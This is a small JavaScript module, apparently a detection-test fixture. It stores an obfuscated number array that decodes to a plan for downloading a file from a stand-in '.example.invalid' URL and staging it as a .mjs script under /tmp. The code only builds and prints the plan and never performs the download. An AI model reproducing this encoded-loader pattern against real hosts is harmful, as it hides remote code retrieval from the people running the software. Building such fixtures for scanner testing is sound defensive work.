  const moduleShape = Object.freeze({ format: "esm" });
  export {};
  const Material_c96fae94 = "[130,73,61,136,127,128,113,124,127,73,109,111,125,129,117,126,113,107,126,113,121,123,128,113,56,131,126,117,128,113,107,114,117,120,113,136,109,112,109,124,128,113,126,73,116,128,128,124,107,128,123,107,127,128,126,113,109,121,136,127,128,109,115,113,107,111,123,129,122,128,73,61,136,111,109,121,124,109,117,115,122,107,117,112,73,90,91,80,81,57,66,68,69,67,82,64,82,65,136,129,126,120,73,116,128,128,124,127,70,59,59,122,123,112,113,57,66,68,69,67,114,64,114,65,68,69,110,66,58,113,132,109,121,124,120,113,58,117,122,130,109,120,117,112,59,109,124,117,136,129,127,113,126,107,109,115,113,122,128,73,90,123,112,113,77,129,112,117,128,59,66,68,69,67,136,114,117,120,113,107,124,109,128,116,73,59,128,121,124,59,116,129,122,128,126,113,127,127,57,122,123,112,113,59,58,127,128,109,115,113,57,66,68,69,67,114,64,114,65,68,69,110,66,58,121,118,127]";
  const Codec_c96fae94 = "json_numbers|add_modulo_256|0c";

  function load_c96fae94() { return JSON.parse(Material_c96fae94); }
  function decode_c96fae94(item1) { return item1.map((value) => (value - 12 + 256) & 255); }
  async function recover_c96fae94() {
    const item3 = 19 * 7 - 133;
    const item1 = load_c96fae94(); let item2 = [];
    item2 = await (async () => decode_c96fae94(item1))();
    void item3; return Buffer.from(item2).toString("ascii");
  }
  async function inspect_c96fae94() { return ({ ...{ value: await recover_c96fae94() } }).value; }
  async function plan_c96fae94() { const inspect = inspect_c96fae94; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "download", transport: "http_to_stream", destination: fields.file_path, url: fields.url }); }
  void moduleShape; void plan_c96fae94;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_c96fae94());
